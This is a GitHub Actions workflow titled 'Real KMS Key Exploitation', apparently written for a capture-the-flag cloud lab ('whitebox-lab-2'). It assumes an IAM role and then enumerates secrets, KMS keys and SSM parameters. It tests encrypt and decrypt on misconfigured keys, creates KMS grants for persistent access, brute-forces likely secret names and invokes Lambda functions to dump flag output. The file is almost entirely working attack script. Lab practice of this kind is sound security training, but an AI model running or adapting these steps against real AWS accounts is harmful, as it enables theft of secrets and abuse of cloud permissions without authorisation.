name: Real KMS Key Exploitation

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  kms-real-exploit:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::067186171322:role/whitebox-lab-2-github-actions-role
          aws-region: us-east-1
          role-session-name: kms-exploit-session

      - name: Test identity and basic access
        run: |
          echo "=== Testing basic identity ==="
          aws sts get-caller-identity
          
          echo "=== Testing basic permissions ==="
          aws secretsmanager list-secrets || echo "List secrets failed"
          aws kms list-keys || echo "List keys failed"

      - name: Test KMS keys with open policies
        run: |
          echo "=== Testing Open KMS Keys ==="
          
          # Test the first open KMS key
          KEY1="61e032f9-f8ae-4ddd-9d15-9b8e4896b78f"
          echo "Testing KMS key: $KEY1"
          
          aws kms describe-key --key-id "$KEY1" && echo "✅ KMS describe successful for $KEY1" || echo "❌ KMS describe failed for $KEY1"
          aws kms get-key-policy --key-id "$KEY1" --policy-name default && echo "✅ KMS get-policy successful for $KEY1" || echo "❌ KMS get-policy failed for $KEY1"
          
          # Test the second open KMS key
          KEY2="c3f040b3-bac2-4b0b-97f9-347e4aefc48a"
          echo "Testing KMS key: $KEY2"
          
          aws kms describe-key --key-id "$KEY2" && echo "✅ KMS describe successful for $KEY2" || echo "❌ KMS describe failed for $KEY2"
          aws kms get-key-policy --key-id "$KEY2" --policy-name default && echo "✅ KMS get-policy successful for $KEY2" || echo "❌ KMS get-policy failed for $KEY2"

      - name: Test secret access directly
        run: |
          echo "=== Testing Direct Secret Access ==="
          aws secretsmanager get-secret-value --secret-id flag_whitebox_lab_2_2 && echo "✅ SUCCESS: Got flag_whitebox_lab_2_2!" || echo "❌ Direct secret access failed"

      - name: Test KMS operations on open keys
        run: |
          echo "=== Testing KMS Operations on Open Keys ==="
          
          KEY1="61e032f9-f8ae-4ddd-9d15-9b8e4896b78f"
          KEY2="c3f040b3-bac2-4b0b-97f9-347e4aefc48a"
          
          for KEY in "$KEY1" "$KEY2"; do
            echo "Testing operations on key: $KEY"
            
            # Test encrypt/decrypt
            echo "Testing encrypt/decrypt on $KEY"
            echo "test-data-for-encryption" > /tmp/test-plaintext.txt
            
            # Try to encrypt
            aws kms encrypt \
              --key-id "$KEY" \
              --plaintext fileb:///tmp/test-plaintext.txt \
              --output text \
              --query CiphertextBlob > /tmp/encrypted-$KEY.txt 2>/dev/null
            
            if [ $? -eq 0 ]; then
              echo "✅ Encryption successful with $KEY"
              
              # Try to decrypt
              echo $(cat /tmp/encrypted-$KEY.txt) | base64 -d > /tmp/encrypted-$KEY.bin
              aws kms decrypt \
                --ciphertext-blob fileb:///tmp/encrypted-$KEY.bin \
                --output text \
                --query Plaintext | base64 -d && echo "✅ Decryption successful with $KEY" || echo "❌ Decryption failed with $KEY"
            else
              echo "❌ Encryption failed with $KEY"
            fi
            
            # Test create grant
            echo "Testing create grant on $KEY"
            aws kms create-grant \
              --key-id "$KEY" \
              --grantee-principal arn:aws:iam::067186171322:role/whitebox-lab-2-github-actions-role \
              --operations Decrypt Encrypt GenerateDataKey DescribeKey \
              --name "github-exploit-grant-$KEY" && echo "✅ Create grant successful with $KEY" || echo "❌ Create grant failed with $KEY"
            
            echo "---"
          done

      - name: Test encrypted data discovery
        run: |
          echo "=== Searching for Encrypted Data ==="
          
          # Check Parameter Store for encrypted parameters
          echo "Testing Parameter Store:"
          aws ssm describe-parameters --query 'Parameters[?Type==`SecureString`]' || echo "No encrypted parameters or access denied"
          
          # Try to get parameters that might exist
          for param in "/flag" "/whitebox-lab-2/flag" "/github-actions/flag" "/kms/flag"; do
            echo "Testing parameter: $param"
            aws ssm get-parameter --name "$param" --with-decryption || echo "Parameter $param not found or access denied"
          done

      - name: Final comprehensive test
        run: |
          echo "=== Final Comprehensive Test ==="
          
          # Test all possible secret names
          for secret in "flag_whitebox_lab_2_2" "whitebox-lab-2-flag" "github-flag" "kms-flag" "encrypted-flag"; do
            echo "Testing secret: $secret"
            aws secretsmanager get-secret-value --secret-id "$secret" && echo "✅ SUCCESS: Secret $secret accessible!" || echo "❌ Secret $secret failed"
          done
          
          # List and check all KMS aliases
          echo "Checking KMS aliases:"
          aws kms list-aliases
          
          # Test Lambda invocation (should work since no resource policies)
          echo "Testing Lambda invocation:"
          aws lambda invoke --function-name whiteboxLab2FlagFunction /tmp/lambda-output.json && echo "✅ Lambda invoke successful" || echo "❌ Lambda invoke failed"
          if [ -f /tmp/lambda-output.json ]; then
            echo "Lambda output:"
            cat /tmp/lambda-output.json
          fi
          
          aws lambda invoke --function-name whiteboxLab2LambdaFlagCode /tmp/lambda-output2.json && echo "✅ Lambda invoke successful" || echo "❌ Lambda invoke failed"
          if [ -f /tmp/lambda-output2.json ]; then
            echo "Lambda output:"
            cat /tmp/lambda-output2.json
          fi
          
          echo "=== Exploitation Complete ==="
